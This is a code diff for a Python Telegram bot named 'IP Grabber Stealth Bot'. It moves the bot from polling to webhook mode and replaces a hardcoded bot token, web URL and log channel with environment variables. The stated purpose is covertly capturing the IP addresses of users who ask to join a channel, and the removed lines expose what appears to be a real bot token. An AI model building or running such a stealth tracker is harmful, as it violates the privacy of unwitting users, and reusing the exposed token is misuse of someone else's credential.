@@ -1,12 +1,11 @@
 import telebot
 from telebot import types
 import os
-import time
 import traceback
 
-BOT_TOKEN = "8659783782:AAFDtOxRHrZn-0CRdi-qk6ZsspjJXDLjxgg"
-WEB_URL = "https://ip-grabber-bot-production.up.railway.app"
-LOG_CHANNEL = "-1002290475903"
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+WEB_URL = os.environ.get("WEB_URL")
+LOG_CHANNEL = os.environ.get("LOG_CHANNEL")
 
 print("Bot starting...")
 print("BOT_TOKEN loaded successfully")
@@ -14,7 +13,7 @@ print("WEB_URL loaded:", WEB_URL)
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Bersihkan webhook lama
+# Remove old webhook
 print("Removing old webhook...")
 try:
     bot.remove_webhook()
@@ -23,7 +22,14 @@ except Exception as e:
     print("Failed to remove webhook:")
     print(traceback.format_exc())
 
-time.sleep(10)
+# Set new webhook
+print("Setting webhook...")
+try:
+    bot.set_webhook(url=f"{WEB_URL}/webhook")
+    print("Webhook set successfully")
+except Exception as e:
+    print("Failed to set webhook:")
+    print(traceback.format_exc())
 
 @bot.chat_join_request_handler()
 def handle_join_request(request: types.ChatJoinRequest):
@@ -53,13 +59,5 @@ def handle_join_request(request: types.ChatJoinRequest):
 def start(message):
     bot.reply_to(message, "IP Grabber Stealth Bot is active.")
 
-print("IP Grabber Stealth Bot is running...")
+print("IP Grabber Stealth Bot is configured for webhook mode...")
 
-try:
-    bot.infinity_polling()
-except Exception as e:
-    print("CRITICAL ERROR in infinity_polling:")
-    print("Error type:", type(e).__name__)
-    print("Error message:", str(e))
-    print("Full traceback:")
-    print(traceback.format_exc())
